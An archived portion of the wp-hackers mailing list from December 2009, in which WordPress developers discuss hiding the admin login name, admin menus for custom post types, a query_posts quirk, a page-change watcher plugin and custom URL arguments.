> Just wondered if I could get your opinion on a possible security patch I
> might try and write. I know WordPress is no fan of security through
> obscurity but as it stands right now, if you're publishing posts as the
> admin user, your login name can be harvested from the body_class and author
> URLs. Would there be any interest in seeing it patched to a sanitized
> display_name or nickname? I can't imagine how many WordPress sites are live
> with super-weak passwords and the admin login name just hanging out there.
>
> --
> Ian Stewart
>
> http://ThemeShaper.com/
> http://twitter.com/iandstewart/
> http://ianstewart.stumbleupon.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From mikeschinkel at newclarity.net  Sat Dec  5 17:59:29 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 5 Dec 2009 12:59:29 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
Message-ID: <54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>

On Dec 5, 2009, at 2:52 AM, Ptah Dunbar wrote:
> To quote Stephen:
> 
>> In a way it's a shame that in Admin we moved away from "Action" ("Write". "Edit") menus toward "Thing" ("Posts", "Pages") menus, as this makes it more difficult -- or at least more bulky -- to incorporate custom post types.  Where previously it would have been intuitive to add a new item or two under "Edit", now to follow the existing structure it would be a case of adding a whole new top menu for each new Post Type, which would get big pretty quickly.
> 
> After custom post types becomes mainstream once 2.9 ships, people are going to face the hassle of creating admin menus for them. Going back towards the "Action" type menus will make things A LOT more simpler and consistent with the WordPress publishing experience. Users wouldn't have to think twice about which menu they need to click on to publish content to. They would just click under "Write", and available post types will be presented as submenu items. This is a major prerequisite before any administrative features for custom post types begin.

My first reaction is that going back to Action will add complexity to the default use case for blogging, i.e. to work with Posts.  

It's also the approach that Drupal takes and is one that I always found to be challenging for end users when they wanted to add new content because they usually seemed to be looking for a menu related to what they wanted to add (i.e. a Post or a Product) instead of looking for a generic menu option. Drupal also throws up a list of content types which adds a click and page reload to adding new content.

> I think there's a significance difference between adding a custom plugin page using the menu/ settings API, compared to adding an administrative page for post types. Reverting back to the old "Action" type menus makes the writing and editing experience for any post type consistent with the admin and a lot more scalable. Developers really only need to customize admin elements belonging to their post type's write page.

While I don't have an extremely strong view against Actions menus I'd suggest considering instead having an API that would add a new top level admin menu for each new custom content type.  For example, I could see "Members" and "Companies" as being two top level admin menus. 

And having their own admin menus could be useful because each content-type could easily have special admin options, i.e. Members could have "Interests" and "Purchases" options and Companies could have a "Contacts" and "Products" options. (Please don't fixate on my examples and debate what WordPress is appropriate for; they were just hypothetical examples.)

> If that's too much abstraction, then consider:
> 
> register_post_type( 'articles', array( 'admin' => 'Articles');
> 
> Which just creates the write and edit submenus for the Articles post type, and the developer would need to call the necessary add_meta_box() functions for their page elements on the write page.

I would lean toward something like that, yes.

Further, I think it would also be ideal to be able to remove both the Post and the Page admin options as well as combine any post types into a single admin menu/edit list.  This would give the person setting up a site and/or a plugin full flexibility and to configure a content creation environment that works how they best need and would even let them approximate the approach you suggest above if that is really what they want.

(And while we are add it, can we tackle one of my pet peeves?  Can we change the "Edit" link in the Post and Page admin menus to be "List", or at least "List/Edit?"  Every single time I use WordPress I have to do a mental translation from "Edit" to "List" and vice versa. :-)

> All in all, adding administrative features for custom post types should be dead simple. The developer shouldn't have to do the same work required to create custom plugin pages (using the menu API, settings API, handling option sanitizing, etc.) as those are two distinct administrative task.

100% agreed.

What's more, minimally I think it would be really a good idea in 2.9 to have an "Post Types" link under the Settings menu that lets user add new post types with nothing more (to start) then just a way to add new types names and see a list of those names.  In combination, I think having a list of known types for a given site stored in wp_options is really important.

-Mike Schinkel

From burobjorn at gmail.com  Sat Dec  5 19:08:01 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Sat, 05 Dec 2009 20:08:01 +0100
Subject: [wp-hackers] Odd query_posts behaviour. Bug or feature?
Message-ID: <4B1AAF91.5020605@gmail.com>

Hi,

Just checking if this is intended or a bug (which I will file if no
ticket has been created yet).

Context info:
I use Wordpress Mu 2.8.4a, but I presume this is the same for Wordpress
and I use the Page Tagger plugin which allows one to add tags to Pages
in AFAIK exact the same way as one would add tags to posts. Nothing fancy.

Now I want to query either the published pages with the tag test or the
posts published posts with tag 'test'. This is what I use to query only
posts with the tag I'm interested in:

[code]

  // setup query params
  $q_params = array( 'showposts' => 10, 'paged' =>$paged 'tag' =>
                     'testing', post_status => 'publish',
                      post_type => 'post'
                   );

  // perform query
  query_posts($q_params);

[/code]

However I get everything tagged with the tag testing. Both pages and
posts. A quick echo on the wp_query->request shows that my post_type
parameter has been ignored.

Is this intended? If so what would be the right way to  do what I want?

Any help much appreciated!

-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From if.website at gmail.com  Sat Dec  5 19:15:26 2009
From: if.website at gmail.com (Austin Matzko)
Date: Sat, 5 Dec 2009 13:15:26 -0600
Subject: [wp-hackers] Odd query_posts behaviour. Bug or feature?
In-Reply-To: <4B1AAF91.5020605@gmail.com>
References: <4B1AAF91.5020605@gmail.com>
Message-ID: <674b4a3b0912051115u5a79d8eft7b5ad8d67c183e33@mail.gmail.com>

On Sat, Dec 5, 2009 at 1:08 PM, Bjorn Wijers <burobjorn at gmail.com> wrote:
> I use Wordpress Mu 2.8.4a, but I presume this is the same for Wordpress
> and I use the Page Tagger plugin which allows one to add tags to Pages
> in AFAIK exact the same way as one would add tags to posts. Nothing fancy.

But that's the source of your problem: this plugin modifies the sets
post_type to "any" whenever tags are queried.

From m at mullenweg.com  Sat Dec  5 19:44:07 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat, 05 Dec 2009 11:44:07 -0800
Subject: [wp-hackers] Possible security patch
In-Reply-To: <349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com>
Message-ID: <4B1AB807.2000503@mullenweg.com>

On 2009-12-05 8:28 AM, scribu wrote:
> The correct solution would be to not use an admin user for posting. You can
> use the User Switching plugin for making this easier.
>
> Also, the login name can be harvested by looking at the author archive URLs.

Agreed on this.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From joost at yoast.com  Sat Dec  5 19:45:30 2009
From: joost at yoast.com (Joost de Valk)
Date: Sat, 5 Dec 2009 20:45:30 +0100
Subject: [wp-hackers] Possible security patch
In-Reply-To: <4B1AB807.2000503@mullenweg.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com>
	<4B1AB807.2000503@mullenweg.com>
Message-ID: <89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com>

Can I vote for rolling the user switching plugin into core?

Joost de Valk

Sent from my iPhone

On Dec 5, 2009, at 20:44, Matt Mullenweg <m at mullenweg.com> wrote:

> On 2009-12-05 8:28 AM, scribu wrote:
>> The correct solution would be to not use an admin user for posting.  
>> You can
>> use the User Switching plugin for making this easier.
>>
>> Also, the login name can be harvested by looking at the author  
>> archive URLs.
>
> Agreed on this.
>
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From scribu at gmail.com  Sat Dec  5 19:51:24 2009
From: scribu at gmail.com (scribu)
Date: Sat, 5 Dec 2009 21:51:24 +0200
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
Message-ID: <349fe48b0912051151p5d5b2d70pf2d2fc3b465437d5@mail.gmail.com>

>
> What's more, minimally I think it would be really a good idea in 2.9 to
> have an "Post Types" link under the Settings menu that lets user add new
> post types with nothing more (to start) then just a way to add new types
> names and see a list of those names.  In combination, I think having a list
> of known types for a given site stored in wp_options is really important.
>
> -Mike Schinkel
>

If you would have read the ticket on trac, you would know that that's not
going to happen in 2.9.


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Sat Dec  5 20:06:13 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 5 Dec 2009 15:06:13 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <349fe48b0912051151p5d5b2d70pf2d2fc3b465437d5@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
	<349fe48b0912051151p5d5b2d70pf2d2fc3b465437d5@mail.gmail.com>
Message-ID: <A80F0BD8-373B-44AF-B236-DC48618B4864@newclarity.net>

On Dec 5, 2009, at 2:51 PM, scribu wrote:
>> What's more, minimally I think it would be really a good idea in 2.9 to
>> have an "Post Types" link under the Settings menu that lets user add new
>> post types with nothing more (to start) then just a way to add new types
>> names and see a list of those names.  In combination, I think having a list
>> of known types for a given site stored in wp_options is really important.
> 
> If you would have read the ticket on trac, you would know that that's not
> going to happen in 2.9.

I did read it. My memory was that it was stated to "probably not happen" in 2.9 which is why I posited that I thought it would be a good idea.  FWIW.

-Mike

From m at mullenweg.com  Sat Dec  5 20:12:50 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat, 05 Dec 2009 12:12:50 -0800
Subject: [wp-hackers] Possible security patch
In-Reply-To: <89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com>	<4B1AB807.2000503@mullenweg.com>
	<89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com>
Message-ID: <4B1ABEC2.6040609@mullenweg.com>

On 2009-12-05 11:45 AM, Joost de Valk wrote:
> Can I vote for rolling the user switching plugin into core?

You can, but it doesn't have anything to do with security.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From SuperMoonMan at gmail.com  Sat Dec  5 20:31:35 2009
From: SuperMoonMan at gmail.com (Steven Rossi)
Date: Sat, 5 Dec 2009 15:31:35 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <4B1ABEC2.6040609@mullenweg.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com> 
	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com> 
	<4B1AB807.2000503@mullenweg.com>
	<89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com> 
	<4B1ABEC2.6040609@mullenweg.com>
Message-ID: <474320ee0912051231iabf6a1fy2abc1b225c49ef8@mail.gmail.com>

Yeah, I think the User Switching plugin would be a nice feature to have
built-in, but consider how often you use it on your OS. It's really a breeze
to use a non-administrator account on a PC (it's easier on a Mac, but less
relevant because of less threat) and to switch to an administrator account
when necessary, whether through Fast User Switching or the Run As...
right-click function (if that still exists past XP, I'm not sure), but who
actually does that? Too inconvenient. I'm just not sure having that
functionality included in Wordpress would be much more than a "nice
feature."

Steven Rossi
http://www.letsmovetothemoon.com
http://www.stevenjrossi.com
http://www.twitter.com/supermoonman

On Sat, Dec 5, 2009 at 3:12 PM, Matt Mullenweg <m at mullenweg.com> wrote:

> On 2009-12-05 11:45 AM, Joost de Valk wrote:
>
>> Can I vote for rolling the user switching plugin into core?
>>
>
> You can, but it doesn't have anything to do with security.
>
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
>

From viniciusandre at gmail.com  Sat Dec  5 22:43:22 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sat, 5 Dec 2009 20:43:22 -0200
Subject: [wp-hackers] Looking for some website watcher plugin...
Message-ID: <4ede8f490912051443t31677551j29478a50dc32b558@mail.gmail.com>

Hi!

I was just wondering if there's a plugin for this.

On my computer I set some cron jobs to fetch some pages, cache them,
and in the future cache them again to compare the files and check if
the website was updated. Most of these website are static, so there's
no RSS feed and so.

Is there anything that some of you guys know that can do something
like this in Wordpress with its pseudocron functionality?
I'm searching, but found nothing until now.

If not... I'll start coding... =)
Thanks.
--
Vin?cius Massuchetto

From viniciusandre at gmail.com  Sat Dec  5 22:44:29 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sat, 5 Dec 2009 20:44:29 -0200
Subject: [wp-hackers] Looking for some website watcher plugin...
In-Reply-To: <4ede8f490912051443t31677551j29478a50dc32b558@mail.gmail.com>
References: <4ede8f490912051443t31677551j29478a50dc32b558@mail.gmail.com>
Message-ID: <4ede8f490912051444p248c7ffeq129fd43fc062d7ea@mail.gmail.com>

On Sat, Dec 5, 2009 at 8:43 PM, Vinicius Massuchetto
<viniciusandre at gmail.com> wrote:
> Hi!
>
> I was just wondering if there's a plugin for this.
>
> On my computer I set some cron jobs to fetch some pages, cache them,
> and in the future cache them again to compare the files and check if
> the website was updated. Most of these website are static, so there's
> no RSS feed and so.
>
> Is there anything that some of you guys know that can do something
> like this in Wordpress with its pseudocron functionality?
> I'm searching, but found nothing until now.
>
> If not... I'll start coding... =)
> Thanks.

Oh, I forgot.
My script mails me if the page changed.

Thanks.
--
Vin?cius Massuchetto

From feeds at armeda.com  Sat Dec  5 23:01:27 2009
From: feeds at armeda.com (Dre Armeda)
Date: Sat, 05 Dec 2009 15:01:27 -0800
Subject: [wp-hackers] Looking for some website watcher plugin...
In-Reply-To: <4ede8f490912051444p248c7ffeq129fd43fc062d7ea@mail.gmail.com>
References: <4ede8f490912051443t31677551j29478a50dc32b558@mail.gmail.com>
	<4ede8f490912051444p248c7ffeq129fd43fc062d7ea@mail.gmail.com>
Message-ID: <4B1AE647.9060306@armeda.com>

Take a look at http://sucuri.net/?page=nbi It was put together by Daniel 
Cid, creator of OSSEC HIDS.

Dre

On 12/5/09 2:44 PM, Vinicius Massuchetto wrote:
> On Sat, Dec 5, 2009 at 8:43 PM, Vinicius Massuchetto
> <viniciusandre at gmail.com>  wrote:
>    
>> Hi!
>>
>> I was just wondering if there's a plugin for this.
>>
>> On my computer I set some cron jobs to fetch some pages, cache them,
>> and in the future cache them again to compare the files and check if
>> the website was updated. Most of these website are static, so there's
>> no RSS feed and so.
>>
>> Is there anything that some of you guys know that can do something
>> like this in Wordpress with its pseudocron functionality?
>> I'm searching, but found nothing until now.
>>
>> If not... I'll start coding... =)
>> Thanks.
>>      
> Oh, I forgot.
> My script mails me if the page changed.
>
> Thanks.
> --
> Vin?cius Massuchetto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From office at wpseek.com  Sat Dec  5 23:12:45 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Sun, 06 Dec 2009 00:12:45 +0100
Subject: [wp-hackers] Looking for some website watcher plugin...
In-Reply-To: <4B1AE647.9060306@armeda.com>
References: <4ede8f490912051443t31677551j29478a50dc32b558@mail.gmail.com>	<4ede8f490912051444p248c7ffeq129fd43fc062d7ea@mail.gmail.com>
	<4B1AE647.9060306@armeda.com>
Message-ID: <4B1AE8ED.5090306@wpseek.com>

Built in, that would be possible with get_posts or get_pages (depends on 
what you'd like to monitor):

- http://codex.wordpress.org/Function_Reference/get_posts#Order_parameters
- http://codex.wordpress.org/Function_Reference/get_pages#Parameters

Have a look at the orderby parameters 'post_modified' (get_pages) and 
'modified' (get_posts).


On 06.12.2009 00:01, Dre Armeda wrote:
> Take a look at http://sucuri.net/?page=nbi It was put together by 
> Daniel Cid, creator of OSSEC HIDS.
>
> Dre
>
> On 12/5/09 2:44 PM, Vinicius Massuchetto wrote:
>> On Sat, Dec 5, 2009 at 8:43 PM, Vinicius Massuchetto
>> <viniciusandre at gmail.com>  wrote:
>>> Hi!
>>>
>>> I was just wondering if there's a plugin for this.
>>>
>>> On my computer I set some cron jobs to fetch some pages, cache them,
>>> and in the future cache them again to compare the files and check if
>>> the website was updated. Most of these website are static, so there's
>>> no RSS feed and so.
>>>
>>> Is there anything that some of you guys know that can do something
>>> like this in Wordpress with its pseudocron functionality?
>>> I'm searching, but found nothing until now.
>>>
>>> If not... I'll start coding... =)
>>> Thanks.
>> Oh, I forgot.
>> My script mails me if the page changed.
>>
>> Thanks.
>> -- 
>> Vin??cius Massuchetto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From tprinty at mail.edisonave.net  Sun Dec  6 00:48:34 2009
From: tprinty at mail.edisonave.net (Tom Printy)
Date: Sat, 05 Dec 2009 18:48:34 -0600
Subject: [wp-hackers] query string paramaters
Message-ID: <4B1AFF62.4020709@mail.edisonave.net>

Hello,

I am attempting to create a plugin that will be used on a page or 
multiple pages.
What I hope to do is use arguments in the query string to modify the 
contents of the page.

I was hoping I could have a url like

htt://myblog.com/about/arg1/arg2

Is something like this possible without modifying the .htaccess file?

Thanks
-Tom Printy

-- 
-Tom Printy
Office Hours: M-F 9:00am CT to 12:00pm CT
www.edisonave.com
847-558-9154


From wp-hackers at striderweb.com  Sun Dec  6 01:13:49 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 5 Dec 2009 19:13:49 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
Message-ID: <F977A87E-2B91-44EA-8096-75220DEE586C@striderweb.com>


On Dec 5, 2009, at 11:59 AM, Mike Schinkel wrote:

> On Dec 5, 2009, at 2:52 AM, Ptah Dunbar wrote:
>> To quote Stephen:
>> 
>>> In a way it's a shame that in Admin we moved away from "Action" ("Write". "Edit") menus toward "Thing" ("Posts", "Pages") menus
> 
> My first reaction is that going back to Action will add complexity to the default use case for blogging, i.e. to work with Posts.

I am against major changes to the Admin UI. There were significant changes in 2.6, and again in 2.7.  It is what it is now, and it would be a very bad idea to *again* make large changes to it any time soon.  "It's a shame" was not meant to indicate that we should change it back.

Also, I agree with Mike -- "Pages" and "Posts" menus is easier for the layman to figure out.

> While I don't have an extremely strong view against Actions menus I'd suggest considering instead having an API that would add a new top level admin menu for each new custom content type.  For example, I could see "Members" and "Companies" as being two top level admin menus. 

I think that actually adding the menus should be up to the Plugin.  Depending on the situation, it may make sense to have a new top level menu, or to add a new submenu, or to have a new top level with multiple sub menus with Edit/New for various Post Types.

In other words, leave it flexible.  Plugins can readily add menu items right now.  The **primary** thing I have in mind in all this is making it very easy to write the function that defines the Edit or Add page for a post type.

* Define a Post Type?  Already exists.

* Add a menu item?  Already exists.

* Define the Edit Page?  Possible, but too complicated.  Simplify this.

* Define  the page that lists those posts?  Difficult.  Abstract the existing system to allow custom pages.

> And having their own admin menus could be useful because each content-type could easily have special admin options, i.e. Members could have "Interests" and "Purchases" options and Companies could have a "Contacts" and "Products" options. (Please don't fixate on my examples and debate what WordPress is appropriate for; they were just hypothetical examples.)

Good examples.  Making the point that we should leave the menu additions up to the plugin, and that code already exists.

>> If that's too much abstraction, then consider:
>> 
>> register_post_type( 'articles', array( 'admin' => 'Articles');
>> 
>> Which just creates the write and edit submenus for the Articles post type, and the developer would need to call the necessary add_meta_box() functions for their page elements on the write page.
> 
> I would lean toward something like that, yes.

I wouldn't even go that far.  Registering the Post Type and creating the menu items are two separate steps.  I don't think *two* lines of code is too arduous a demand to put on plugin authors.  ;-)

> Further, I think it would also be ideal to be able to remove both the Post and the Page admin options

Agreed.  I think you can already do this though.  Perhaps a wrapper function to make it easier....

> as well as combine any post types into a single admin menu/edit list.  This would give the person setting up a site and/or a plugin full flexibility and to configure a content creation environment that works how they best need and would even let them approximate the approach you suggest above if that is really what they want.

Interesting idea.  So allow a plugin to set up an Write page that has, say, a drop down listing multiple Post Types.  The "List/Edit" page could be (optionally) show multiple types, and have a drop down with a "Filter" button.

Note that for the write page, it would only work for two Post Types that have all the same meta boxes -- unless you want the page to reload when changing Post Type.  (Ajax is nice, but we should not be dependent on it for functionality.)

> (And while we are add it, can we tackle one of my pet peeves?

No.


;-)

>> All in all, adding administrative features for custom post types should be dead simple. The developer shouldn't have to do the same work required to create custom plugin pages (using the menu API, settings API, handling option sanitizing, etc.) as those are two distinct administrative task.
> 
> 100% agreed.

Is the existing Menu API really that difficult to use?  One good tutorial should sort that out.  Abstracting it is going to just artificially limit what you can do (or have a ridiculous number of parameters). 

> What's more, minimally I think it would be really a good idea in 2.9...

3.0, since 2.9 is in feature freeze...

> ...to have an "Post Types" link under the Settings menu that lets user add new post types with nothing more (to start) then just a way to add new types names and see a list of those names.

I disagree.  In a default install there is no need, and what you describe is too little use without more custom code via a plugin anyway.

> In combination, I think having a list of known types for a given site stored in wp_options is really important.

How is it stored now?  2.9 allows you to register Post Types now, doesn't it?  Where is it stored?


-- 
Stephen Rider
http://striderweb.com/


From burobjorn at gmail.com  Sun Dec  6 02:23:30 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Sun, 06 Dec 2009 03:23:30 +0100
Subject: [wp-hackers] query string paramaters
In-Reply-To: <4B1AFF62.4020709@mail.edisonave.net>
References: <4B1AFF62.4020709@mail.edisonave.net>
Message-ID: <4B1B15A2.5000407@gmail.com>

Yes, this is possible.

Have a look at:
http://codex.wordpress.org/Custom_Queries#Permalinks_for_Custom_Archives

Hope this helps,

grtz
BjornW


> Hello,
> 
> I am attempting to create a plugin that will be used on a page or
> multiple pages.
> What I hope to do is use arguments in the query string to modify the
> contents of the page.
> 
> I was hoping I could have a url like
> 
> htt://myblog.com/about/arg1/arg2
> 
> Is something like this possible without modifying the .htaccess file?
> 
> Thanks
> -Tom Printy
> 


-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From tprinty at mail.edisonave.net  Sun Dec  6 02:44:17 2009
From: tprinty at mail.edisonave.net (Tom Printy)
Date: Sat, 05 Dec 2009 20:44:17 -0600
Subject: [wp-hackers] query string paramaters
In-Reply-To: <4B1B15A2.5000407@gmail.com>
References: <4B1AFF62.4020709@mail.edisonave.net> <4B1B15A2.5000407@gmail.com>
Message-ID: <4B1B1A81.6030402@mail.edisonave.net>

Thanks this is what I was looking for!

-Tom


Bjorn Wijers wrote:
> Yes, this is possible.
>
> Have a look at:
> http://codex.wordpress.org/Custom_Queries#Permalinks_for_Custom_Archives
>
> Hope this helps,
>
> grtz
> BjornW
>
>
>   
>> Hello,
>>
>> I am attempting to create a plugin that will be used on a page or
>> multiple pages.
>> What I hope to do is use arguments in the query string to modify the
>> contents of the page.
>>
>> I was hoping I could have a url like
>>
>> htt://myblog.com/about/arg1/arg2
>>
>> Is something like this possible without modifying the .htaccess file?
>>
>> Thanks
>> -Tom Printy
>>
>>     
>
>
>   


-- 
-Tom Printy
Office Hours: M-F 9:00am CT to 12:00pm CT
www.edisonave.com
847-558-9154


From mikeschinkel at newclarity.net  Sun Dec  6 03:38:34 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 5 Dec 2009 22:38:34 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <F977A87E-2B91-44EA-8096-75220DEE586C@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
	<F977A87E-2B91-44EA-8096-75220DEE586C@striderweb.com>
Message-ID: <04D9AC6C-BA76-4900-9752-C8358B1A1DBE@newclarity.net>

On Dec 5, 2009, at 8:13 PM, Stephen Rider wrote:
> On Dec 5, 2009, at 11:59 AM, Mike Schinkel wrote:

> I am against major changes to the Admin UI. There were significant changes in 2.6, and again in 2.7.  It is what it is now, and it would be a very bad idea to *again* make large changes to it any time soon.  "It's a shame" was not meant to indicate that we should change it back.

> 

Agreed, that argument makes sense.

>> While I don't have an extremely strong view against Actions menus I'd suggest considering instead having an API that would add a new top level admin menu for each new custom content type.  For example, I could see "Members" and "Companies" as being two top level admin menus. 
> 
> I think that actually adding the menus should be up to the Plugin.  Depending on the situation, it may make sense to have a new top level menu, or to add a new submenu, or to have a new top level with multiple sub menus with Edit/New for various Post Types.

Once an admin UI is in place in the core to support Custom Post Types I would think it would be very important for the administrator to have the option to specify that an admin menu be added for a new Custom Post Type.  

I think it would be very strange and very difficult to understand if there were an admin option to add a Custom Post Type but then there was nowhere in admin console and that installing a plugin were required to expose it.

> In other words, leave it flexible. 

That said, it would be great if omitting an add/edit menu were an option and/or it were easy to add a customizable add/edit menu option and of course for plugins to be able to completely specify what should be there.

BTW, I realize that the functions you are trying to specify are likely to be a precursor to and even enable any admin functionality.

>> as well as combine any post types into a single admin menu/edit list.  This would give the person setting up a site and/or a plugin full flexibility and to configure a content creation environment that works how they best need and would even let them approximate the approach you suggest above if that is really what they want.
> 
> Interesting idea.  So allow a plugin to set up an Write page that has, say, a drop down listing multiple Post Types.  The "List/Edit" page could be (optionally) show multiple types, and have a drop down with a "Filter" button.
> 
> Note that for the write page, it would only work for two Post Types that have all the same meta boxes -- unless you want the page to reload when changing Post Type.  (Ajax is nice, but we should not be dependent on it for functionality.)

Well, I was thinking more of an interstitial page that listed the content types and then clicking on them would take the user to the correct add page (this is how Drupal does it.)  If the functions were modular enough then they could be assembled to do this.  OTOH, I'm not advocating for a feature that would work that, but believe it would be good if the current features would have the required flexibility to work in that manner.

>> (And while we are add it, can we tackle one of my pet peeves?
> 
> No.

;-p

> Is the existing Menu API really that difficult to use?  One good tutorial should sort that out.  Abstracting it is going to just artificially limit what you can do (or have a ridiculous number of parameters). 

For the record, I'm not that overly concerned about the difficulty of the menu APIs. Yes, I think the menu functional are poorly designed requiring many positional parameters instead of an array containing named arguments but all in all they are usable and besides that wasn't the direction I was trying to take things. I was instead primarily asserting that moving to Action menus would be probably not be a great idea, secondarily having a modular architecture for what you were proposing would be important and finally that basic admin UI support for post types should be in the core.  

I think we are in full agreement except on weather there should or should not be any admin UI for custom posts built into the core.

>> What's more, minimally I think it would be really a good idea in 2.9...
> 
> 3.0, since 2.9 is in feature freeze...

